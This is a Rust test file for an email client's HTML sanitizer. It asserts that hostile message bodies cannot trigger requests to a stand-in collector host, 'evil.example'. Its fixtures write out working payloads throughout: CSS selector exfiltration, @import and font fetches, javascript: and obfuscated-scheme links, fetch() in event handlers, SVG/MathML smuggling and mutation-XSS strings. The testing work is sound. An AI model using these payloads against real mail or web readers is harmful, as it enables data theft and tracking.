//! One hostile message per technique, and what the reader's WebView is left
//! holding.
//!
//! `render.rs` is the attack suite this sits beside; it asserts on the *shape*
//! of the output (which elements, which attributes, which schemes). This file
//! asserts the one thing that actually matters to the reader and that a shape
//! check cannot state: **no request leaves the machine**. Every fixture names a
//! collector at `evil.example`, and the assertion is that the string handed to
//! the WebView does not mention it anywhere — not in an attribute, not in a
//! stylesheet, not in text a later pass might re-parse. A host the document
//! cannot name is a host it cannot fetch, and that claim holds without making
//! the request to find out.
//!
//! Every test here passed the first time it was written. That is the point of
//! them: they are not fixes, they are the record of which mechanism already
//! stops which attack, so that widening an allowlist has to break something
//! visible. Each one names the mechanism it depends on.
//!
//! The techniques are the published ones against mail clients — CSS
//! attribute-selector exfiltration, `@import`, `@font-face`, mutation XSS
//! through re-parsing, namespace confusion — rather than a list of tags.

use mach_lib::render::sanitize::sanitize_fragment;

/// The collector. Nothing in any output may name it.
const EVIL: &str = "evil.example";

/// Sanitize with remote images *allowed*, which is the app's default and the
/// permissive of the two modes. A fixture that leaks nothing here leaks nothing
/// in the strict mode either.
fn render(html: &str) -> String {
    sanitize_fragment(html, true).0
}

/// The whole claim: after sanitizing, the document cannot name the collector,
/// so no construct in it can fetch from the collector.
///
/// Checked case-insensitively and after undoing HTML escaping, because an
/// escaped mention is still a mention as far as a re-parse is concerned.
#[track_caller]
fn assert_no_fetch(html: &str) {
    let out = render(html);
    let unescaped = out
        .replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .to_ascii_lowercase();
    assert!(
        !unescaped.contains(EVIL),
        "the collector survived into the rendered document\n---\n{out}\n---"
    );
}

/// The same, plus: whatever legitimate content sat beside the attack is still
/// there. Over-sanitizing is its own failure — a message that renders as
/// nothing is not a message that was defended.
#[track_caller]
fn assert_no_fetch_but_keeps(html: &str, kept: &str) {
    assert_no_fetch(html);
    let out = render(html);
    assert!(
        out.contains(kept),
        "legitimate content {kept:?} was destroyed along with the attack\n---\n{out}\n---"
    );
}

/// Every mention of the collector sits behind `data-mach-blocked-src`, i.e. the
/// WebView has no way to fetch it without the reader opting in. Asked of the
/// strict mode, where deferral rather than removal is the mechanism.
#[track_caller]
fn assert_only_deferred(html: &str) {
    let out = sanitize_fragment(html, false).0;
    let mut at = 0usize;
    while let Some(rel) = out[at..].find(EVIL) {
        let i = at + rel;
        at = i + 1;
        let before = &out[..i];
        let opener = before
            .rfind("=\"")
            .unwrap_or_else(|| panic!("collector mentioned outside an attribute\n{out}"));
        let name_start = before[..opener]
            .rfind(|c: char| c.is_ascii_whitespace() || c == '<')
            .map(|p| p + 1)
            .unwrap_or(0);
        assert_eq!(
            &before[name_start..opener],
            "data-mach-blocked-src",
            "the collector is reachable without the reader asking\n---\n{out}\n---"
        );
    }
}

// ===========================================================================
// CSS exfiltration
//
// The published attack on mail clients, and the one that needs no script at
// all: an attribute selector matches a prefix of some text in the document and
// a `background: url()` on the match tells the sender it matched. Repeat per
// character and the sender reads the text out of the reader's own renderer.
//
// Mechanism: `<style>` is in `CONTENT_DROPPED_TAGS`, so a stylesheet and its
// text go together. There is no allowlisted element on which a selector can be
// written, which is what makes the whole family unreachable rather than
// filtered. The `style=` *attribute* survives, and is a different animal: it
// has no selector, so it can only style the element it is on.
// ===========================================================================

#[test]
fn attribute_selector_exfiltration_has_nowhere_to_be_written() {
    assert_no_fetch_but_keeps(
        r#"<style>
             a[href^="a"]{background:url(https://evil.example/a)}
             a[href^="b"]{background:url(https://evil.example/b)}
           </style>
           <a href="https://bank.test/secret-token">statement</a>"#,
        "statement",
    );
}

#[test]
fn the_stylesheet_text_does_not_survive_as_text_either() {
    // Dropping the element but keeping its children would put CSS source into
    // the reading pane, and — worse — into anything that later re-parses the
    // body. `clean_content_tags` takes the subtree.
    let out = render(r#"<style>body{background:url(https://evil.example/x)}</style><p>hi</p>"#);
    assert_eq!(out, "<p>hi</p>");
}

#[test]
fn import_and_font_face_cannot_reach_a_stylesheet() {
    assert_no_fetch(r#"<style>@import url("https://evil.example/leak.css");</style>"#);
    assert_no_fetch(
        r#"<style>@font-face{font-family:x;src:url(https://evil.example/f.woff2)}
           body{font-family:x}</style><p>hi</p>"#,
    );
}

#[test]
fn a_stylesheet_smuggled_through_a_foreign_namespace_is_still_a_stylesheet() {
    // `<svg><style>` and `<math><style>` parse into the SVG and MathML
    // namespaces, where a filter that only knows HTML element names has
    // historically waved them through. Both parents are content-dropped.
    assert_no_fetch(r#"<svg><style>@import url(https://evil.example/i.css)</style></svg>"#);
    assert_no_fetch(r#"<math><style>@import url(https://evil.example/i.css)</style></math>"#);
    assert_no_fetch(
        r#"<svg><foreignObject><style>*{background:url(https://evil.example/x)}</style></foreignObject></svg>"#,
    );
}

#[test]
fn every_fetching_css_value_is_refused_inside_a_style_attribute() {
    // `style=` survives because email *is* inline styles. `CSS_FORBIDDEN` is
    // what makes surviving harmless: any declaration containing `url`, `@`,
    // `image-set`, `element(`, `attr(`, `var(`, `--` or a CSS escape is dropped
    // whole rather than repaired.
    for value in [
        "background:url(https://evil.example/a)",
        "background-color:red;background:URL('https://evil.example/a')",
        "background:\\75 rl(https://evil.example/a)",
        "background:ur/**/l(https://evil.example/a)",
        "background:-webkit-image-set(url(https://evil.example/a) 1x)",
        "background:image-set('https://evil.example/a' 1x)",
        "background:cross-fade(url(https://evil.example/a), red)",
        "background:element(#x);color:red",
        "background:paint(evil.example)",
        "--leak:url(https://evil.example/a);background:var(--leak)",
        "background:expression(document.write('evil.example'))",
        "behavior:url(https://evil.example/x.htc)",
        "-moz-binding:url(https://evil.example/x.xml)",
        "list-style-image:url(https://evil.example/a)",
        "border-image:url(https://evil.example/a)",
        "content:url(https://evil.example/a)",
        "cursor:url(https://evil.example/a),auto",
        "filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://evil.example/a')",
    ] {
        assert_no_fetch(&format!(r#"<div style="{value}">x</div>"#));
    }
}

#[test]
fn an_ordinary_inline_style_still_survives_all_of_that() {
    // The cost of the rule above, measured. Marketing mail is inline styles and
    // a scrubber that ate them would be its own failure.
    let out = render(
        r##"<table><tr><td style="background-color:#f6f6f6;padding:12px 24px;font-family:Helvetica,Arial,sans-serif;font-size:14px;color:#333;text-align:center;border-radius:4px">Shop now</td></tr></table>"##,
    );
    for kept in [
        "background-color:#f6f6f6",
        "padding:12px 24px",
        "font-size:14px",
        "text-align:center",
        "border-radius:4px",
    ] {
        assert!(out.contains(kept), "{kept} was dropped from ordinary mail\n{out}");
    }
}

// ===========================================================================
// Remote content as a tracking channel
//
// The blocked-image mechanism only covers `<img src>`, and it does not need to
// cover anything else: every other construct that can fetch is removed rather
// than deferred, because there is no affordance to load one later. These pin
// that "removed" — one test per construct the brief names.
//
// Mechanism: `URL_ATTRS` is a default-deny list consulted before anything else,
// so an attribute that can name a resource is dropped unless the filter handles
// it by name. Elements that fetch without an attribute of their own are in
// `CONTENT_DROPPED_TAGS`.
// ===========================================================================

#[test]
fn css_backgrounds_video_posters_and_input_images_all_fetch_and_none_survive() {
    assert_no_fetch(r#"<video poster="https://evil.example/p.jpg"></video>"#);
    assert_no_fetch(r#"<video><source src="https://evil.example/v.mp4"></video>"#);
    assert_no_fetch(r#"<audio src="https://evil.example/a.mp3"></audio>"#);
    assert_no_fetch(r#"<input type="image" src="https://evil.example/p.gif">"#);
    assert_no_fetch(r#"<object data="https://evil.example/x.swf"></object>"#);
    assert_no_fetch(r#"<embed src="https://evil.example/x.swf">"#);
    assert_no_fetch(r#"<applet archive="https://evil.example/x.jar"></applet>"#);
    assert_no_fetch(r#"<iframe src="https://evil.example/x"></iframe>"#);
    assert_no_fetch(r#"<frameset><frame src="https://evil.example/x"></frameset>"#);
}

#[test]
fn every_shape_of_preload_and_prefetch_is_gone() {
    for rel in ["preload", "prefetch", "dns-prefetch", "preconnect", "stylesheet", "icon"] {
        assert_no_fetch(&format!(
            r#"<link rel="{rel}" as="image" href="https://evil.example/p.gif"><p>hi</p>"#
        ));
    }
}

#[test]
fn srcset_and_picture_cannot_smuggle_a_second_url_past_the_image_rules() {
    // The image rules look at `src`. `srcset` names a *different* URL that the
    // engine may prefer, so a deferred `src` with a live `srcset` would defeat
    // the whole mechanism. `srcset` is in `URL_ATTRS`; `<source>` is
    // content-dropped.
    assert_no_fetch_but_keeps(
        r#"<picture>
             <source srcset="https://evil.example/a.webp" type="image/webp">
             <img src="https://cdn.test/real.png" srcset="https://evil.example/b.png 2x" width="600" height="200" alt="a photo">
           </picture>"#,
        "https://cdn.test/real.png",
    );
}

#[test]
fn the_legacy_background_attribute_is_a_fetch_and_is_dropped() {
    assert_no_fetch_but_keeps(
        r##"<table background="https://evil.example/t.png"><tr><td background="https://evil.example/c.png" bgcolor="#eee">cell</td></tr></table>"##,
        "cell",
    );
    assert_no_fetch(r#"<body background="https://evil.example/bg.png">"#);
}

#[test]
fn a_ping_attribute_is_a_beacon_and_is_dropped() {
    assert_no_fetch_but_keeps(
        r#"<a href="https://ok.test/x" ping="https://evil.example/ping">click</a>"#,
        "https://ok.test/x",
    );
}

#[test]
fn nothing_remote_is_loadable_at_all_when_the_reader_asked_for_that() {
    // The strict mode. Every `<img>` is deferred behind the marker, so the only
    // URL the document carries is one the WebView cannot act on: the frame CSP
    // is `img-src data:` and the value lives in a data attribute.
    let (out, counts) = sanitize_fragment(
        r#"<img src="https://evil.example/logo.png" width="600" height="200"><p>hi</p>"#,
        false,
    );
    assert_eq!(counts.blocked_remote, 1);
    assert!(out.contains("data-mach-blocked-src=\"https://evil.example/logo.png\""));
    assert!(out.contains(&format!("src=\"{}\"", mach_lib::render::sanitize::PLACEHOLDER_PIXEL)));
    // The only mention of the collector is behind the data attribute.
    assert_eq!(out.matches(EVIL).count(), 1);
}

// ===========================================================================
// Script execution, by every route the brief names
//
// Mechanism: `Builder::empty()` plus an allowlist. There is no element in
// `ALLOWED_TAGS` that executes, no attribute in `GENERIC_ATTRS` that executes,
// and `href` is validated with a real URL parser rather than a substring check.
// ===========================================================================

#[test]
fn no_route_to_a_script_survives() {
    for attack in [
        r#"<script>fetch("https://evil.example/")</script>"#,
        r#"<script src="https://evil.example/x.js"></script>"#,
        r#"<img src="x" onerror="fetch('https://evil.example/')">"#,
        r#"<div onmouseover="fetch('https://evil.example/')">hover</div>"#,
        r#"<body onload="fetch('https://evil.example/')">"#,
        r#"<a href="javascript:fetch('https://evil.example/')">go</a>"#,
        "<a href=\"java\tscript:fetch('https://evil.example/')\">go</a>",
        r#"<a href="&#106;avascript:fetch('https://evil.example/')">go</a>"#,
        r#"<a href="JaVaScRiPt:fetch('https://evil.example/')">go</a>"#,
        r#"<a href="data:text/html;base64,ZXZpbC5leGFtcGxl">go</a>"#,
        r#"<a href="vbscript:msgbox('evil.example')">go</a>"#,
        r#"<form action="https://evil.example/"><button formaction="https://evil.example/">go</button></form>"#,
        r#"<meta http-equiv="refresh" content="0;url=https://evil.example/">"#,
        r#"<base href="https://evil.example/">"#,
        r#"<iframe srcdoc="&lt;img src=https://evil.example/x&gt;"></iframe>"#,
        r#"<svg><script>fetch("https://evil.example/")</script></svg>"#,
        r#"<svg><use href="https://evil.example/x.svg#y"/></svg>"#,
        r#"<svg><use xlink:href="https://evil.example/x.svg#y"/></svg>"#,
        r#"<svg><animate attributeName="href" values="https://evil.example/"/></svg>"#,
        r#"<svg><a><set attributeName="href" to="https://evil.example/"/><text>go</text></a></svg>"#,
        r#"<svg><image href="https://evil.example/x.png"/></svg>"#,
        r#"<math><maction actiontype="statusline" xlink:href="https://evil.example/">x</maction></math>"#,
        r#"<template><img src="https://evil.example/x"></template>"#,
        r#"<noembed><img src="https://evil.example/x"></noembed>"#,
        r#"<keygen autofocus onfocus="fetch('https://evil.example/')">"#,
    ] {
        assert_no_fetch(attack);
    }
}

// ===========================================================================
// Sanitizer bypasses
//
// The shape that matters is a string one parser accepts and another re-reads
// differently. There is exactly one parse of a message body in Mach —
// html5ever, inside ammonia — and then WebKit re-parses ammonia's *output*.
// So the question is only ever: can ammonia's serialization mean something
// else to a second parser?
// ===========================================================================

#[test]
fn ammonia_output_never_contains_an_element_that_reparses_differently() {
    // The whole answer to mutation XSS here, and cheaper than chasing
    // individual payloads. Every element whose content model changes between
    // parsers — RAWTEXT, RCDATA, foreign content, or scripting-flag-dependent
    // — is in `CONTENT_DROPPED_TAGS`, so none of them can appear in the output.
    // What is left is ordinary HTML flow content, which parses the same in
    // html5ever with scripting enabled and in a scripting-*disabled* message
    // frame. `<noscript>` is the one where those two disagree, and it is the
    // reason that list is not just "things that execute".
    for attack in [
        r#"<noscript><p title="</noscript><img src=x onerror=fetch('https://evil.example/')>">"#,
        r#"<textarea><img src="https://evil.example/x"></textarea>"#,
        r#"<title><img src="https://evil.example/x"></title>"#,
        r#"<xmp><img src="https://evil.example/x"></xmp>"#,
        r#"<plaintext><img src="https://evil.example/x">"#,
        r#"<style><img src="https://evil.example/x"></style>"#,
        r#"<math><mtext><table><mglyph><style><!--</style><img src="https://evil.example/x">"#,
        r#"<math><annotation-xml encoding="text/html"><style><img src="https://evil.example/x"></style></annotation-xml></math>"#,
        r#"<svg><p><style><!--</style><img src="https://evil.example/x">"#,
        r#"<select><option><style></option></select><img src="https://evil.example/x">"#,
    ] {
        let out = render(attack);
        for banned in [
            "<script", "<style", "<svg", "<math", "<noscript", "<textarea", "<title", "<xmp",
            "<plaintext", "<template", "<iframe", "<noembed", "<select", "<option",
        ] {
            assert!(
                !out.to_ascii_lowercase().contains(banned),
                "{banned} survived into the output of {attack:?}\n---\n{out}\n---"
            );
        }
        // Not `assert_no_fetch`, and the reason is worth writing down. Some of
        // these degrade into a perfectly ordinary `<img src>`: `<svg><p>` is a
        // breakout tag, so html5ever leaves foreign content there and reads the
        // rest as HTML, and `</select>` ends the select the same way. The image
        // that falls out is exactly the image the sender could have written
        // directly, which is allowed content rather than an escape. What must
        // not survive is a *live* fetch the reader did not opt into, so ask the
        // strict mode instead: every mention has to sit behind the deferral.
        assert_only_deferred(attack);
    }
}

#[test]
fn sanitizing_is_a_fixed_point_for_hostile_input_too() {
    // If a second pass changed anything, the first pass's output would mean
    // something different to a second parser — which is the mutation-XSS shape
    // stated as a property rather than as a payload list. `render.rs` asserts
    // this for realistic bodies; these are the ones designed to break it.
    for attack in [
        r#"<p>a<b>b<i>c</p>d</b>e</i>"#,
        r#"<table><td>1<tr><th>2</table>"#,
        r#"<div title="a>b<c">x</div>"#,
        r#"<img alt="<img src=&quot;https://evil.example/x&quot;>" src="https://cdn.test/a.png" width="9" height="9">"#,
        r#"<a href="https://ok.test/?q=&quot;&gt;&lt;img src=x&gt;">x</a>"#,
        r#"<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>"#,
        r#"<p>&amp;lt;script&amp;gt;</p>"#,
        r#"<![CDATA[<img src="https://evil.example/x">]]>"#,
        r#"<!--><img src="https://evil.example/x"><!-->"#,
        r#"<p <script>x</script>>hi"#,
        r#"<div style="color:red" style="background:url(https://evil.example/x)">x</div>"#,
    ] {
        let once = render(attack);
        let twice = render(&once);
        assert_eq!(once, twice, "not a fixed point for {attack:?}");
    }
}

#[test]
fn a_serialized_attribute_value_can_never_be_read_as_a_tag() {
    // Three post-passes (`block_trackers`, and `promote_marker` twice) do string
    // surgery on ammonia's output rather than re-parsing it. That is only sound
    // because the serializer escapes `<`, `>`, `&` and `"` inside an attribute
    // value, so a `<img` written into one cannot be found by a scan for tags.
    // If html5ever ever stopped escaping `>`, this is what would say so.
    let out = render(
        r#"<div title='<img width="1" src="https://evil.example/p.gif">'>x</div><img src="https://cdn.test/real.png" width="600" height="400">"#,
    );
    assert!(out.contains("&lt;img"), "< was not escaped in an attribute value\n{out}");
    assert!(out.contains("&gt;"), "> was not escaped in an attribute value\n{out}");
    assert!(out.contains("&quot;"), "\" was not escaped in an attribute value\n{out}");
    // The collector *is* named — as escaped text inside `title`, which is inert,
    // and is the correct outcome: the sender wrote it as content, so it renders
    // as content. What matters is that no tag was made out of it, and therefore
    // that no later pass over this string can find one.
    assert!(
        !out.contains("<img src=\"https://evil.example"),
        "an attribute value was re-read as a tag\n{out}"
    );
    assert_eq!(out.matches("<img").count(), 1, "one real image, not two\n{out}");
    // And the real image beside it is untouched by the confusion.
    assert!(out.contains(r#"<img src="https://cdn.test/real.png""#));
}

#[test]
fn a_sender_cannot_pre_arm_the_frames_own_machinery() {
    // Three attributes the WebView acts on: two the sanitizer writes, and one
    // the *frame* writes (`data-mach-link-host`, the link disclosure). A sender
    // who could set any of them could load a blocked image without being asked,
    // aim the attachment resolver at another message, or suppress the
    // disclosure on their own phishing link. `data-mach*` is refused by name
    // before anything else in the attribute filter, and no `data-` attribute is
    // allowed in the first place.
    let out = render(
        r#"<img data-mach-blocked-src="https://evil.example/x" data-mach-cid="other@msg" src="https://cdn.test/a.png" width="99" height="99">
           <a href="https://evil.example/" data-mach-link-host="paypal.com">paypal.com</a>
           <span data-mach-link-host="">x</span>"#,
    );
    assert!(!out.contains("data-mach-blocked-src"), "{out}");
    assert!(!out.contains("data-mach-cid"), "{out}");
    assert!(!out.contains("data-mach-link-host"), "{out}");
}

// ===========================================================================
// Not breaking the mail
//
// Every rule above has a cost, and the costs are the thing that goes unmeasured
// until a reader complains. These are the shapes real mail actually has.
// ===========================================================================

#[test]
fn a_real_marketing_message_still_renders_as_itself() {
    let out = render(
        r##"<table width="600" cellpadding="0" cellspacing="0" bgcolor="#ffffff" style="border-collapse:collapse">
             <tr><td align="center" style="padding:24px">
               <a href="https://click.mailer.test/ls/x?u=abc" target="_self" rel="follow">
                 <img src="https://cdn.mailer.test/logo.png" width="180" height="40" alt="Acme" border="0">
               </a>
             </td></tr>
             <tr><td style="font-family:Arial,sans-serif;font-size:15px;line-height:22px;color:#222222;padding:0 24px">
               <h1 style="font-size:22px;margin:0 0 12px">Your order shipped</h1>
               <p>Tracking number <b>1Z999</b>. <a href="https://track.mailer.test/1Z999">Track it</a>.</p>
             </td></tr>
             <tr><td align="center" style="padding:24px">
               <a href="https://shop.mailer.test/orders" style="background-color:#0b5fff;color:#ffffff;padding:12px 24px;border-radius:4px;text-decoration:none;display:inline-block">View order</a>
             </td></tr>
           </table>"##,
    );
    for kept in [
        r#"width="600""#,
        r##"bgcolor="#ffffff""##,
        "border-collapse:collapse",
        r#"src="https://cdn.mailer.test/logo.png""#,
        r#"alt="Acme""#,
        "Your order shipped",
        "font-size:22px",
        "https://track.mailer.test/1Z999",
        "background-color:#0b5fff",
        "border-radius:4px",
        "View order",
    ] {
        assert!(out.contains(kept), "{kept:?} lost from ordinary mail\n---\n{out}\n---");
    }
    // And the sender's own link attributes are replaced with ours, not kept.
    assert!(!out.contains(r#"target="_self""#));
    assert!(!out.contains(r#"rel="follow""#));
    assert_eq!(out.matches(r#"target="_blank""#).count(), 3);
}

#[test]
fn an_inline_logo_delivered_with_the_message_needs_no_permission() {
    let (out, counts) = sanitize_fragment(
        r#"<p>See chart:</p><img src="cid:chart@acme.test" width="400" height="300" alt="Q3"><img src="data:image/png;base64,iVBORw0KGgo=" width="16" height="16">"#,
        false,
    );
    assert_eq!(counts.inline_cid, 1);
    assert_eq!(counts.inline_data, 1);
    // Neither counts against "load images": neither one costs a request.
    assert_eq!(counts.blocked_remote, 0);
    assert!(out.contains(r#"data-mach-cid="chart@acme.test""#));
}
